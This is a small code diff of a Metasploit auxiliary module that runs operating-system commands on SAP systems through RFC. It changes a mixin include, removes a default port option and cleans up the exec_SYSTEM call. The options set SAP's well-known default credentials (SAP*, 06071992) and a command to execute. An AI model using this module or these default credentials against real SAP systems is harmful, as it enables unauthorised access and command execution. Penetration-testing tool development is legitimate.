@@ -14,7 +14,7 @@ require 'msf/core/exploit/sap'
 
 class Metasploit4 < Msf::Auxiliary
 
-  include Msf::Exploit::SAP
+  include Msf::Exploit::SAP::RFC
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
@@ -33,7 +33,6 @@ class Metasploit4 < Msf::Auxiliary
 
     register_options(
       [
-        Opt::RPORT(3342),
         OptString.new('USERNAME', [true, 'Username', 'SAP*']),
         OptString.new('PASSWORD', [true, 'Password', '06071992']),
         OptString.new('CMD', [true, 'Command to Execute', 'id']),
@@ -47,7 +46,7 @@ class Metasploit4 < Msf::Auxiliary
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
     end
     command = datastore['CMD']
-    exec_SYSTEM(user, datastore['CLIENT'],pass,datastore['rhost'],datastore['rport'], command)
+    exec_SYSTEM(user, client, pass, rhost, rport, command)
   end
 
   def exec_SYSTEM(user, client, pass, rhost, rport, command)
